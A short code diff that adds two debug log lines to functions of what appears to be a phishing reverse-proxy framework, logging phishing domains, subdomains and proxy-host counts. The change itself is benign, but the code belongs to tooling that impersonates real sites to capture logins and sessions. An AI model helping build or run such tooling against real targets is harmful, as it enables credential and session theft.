@@ -795,6 +795,7 @@ func (p *Phishlet) GetPhishHosts(use_wildcards bool) []string {
 
 	// Get all active domains
 	domains := p.GetAllActiveDomains()
+	log.Debug("[hostname-dbg] GetPhishHosts phishlet=%s domains=%v proxyHosts_count=%d", p.Name, domains, len(p.proxyHosts))
 
 	for _, phishDomain := range domains {
 		if !use_wildcards {
@@ -956,7 +957,8 @@ func (p *Phishlet) addProxyHost(phish_subdomain string, orig_subdomain string, d
 	if !p.domainExists(domain) {
 		p.domains = append(p.domains, domain)
 	}
-
+	log.Debug("[phishlet-load] addProxyHost phish_sub=%s orig_sub=%s domain=%s -> proxyHosts_count=%d",
+		phish_subdomain, orig_subdomain, domain, len(p.proxyHosts)+1)
 	p.proxyHosts = append(p.proxyHosts, ProxyHost{phish_subdomain: phish_subdomain, orig_subdomain: orig_subdomain, domain: domain, handle_session: handle_session, is_landing: is_landing, auto_filter: auto_filter})
 }
 
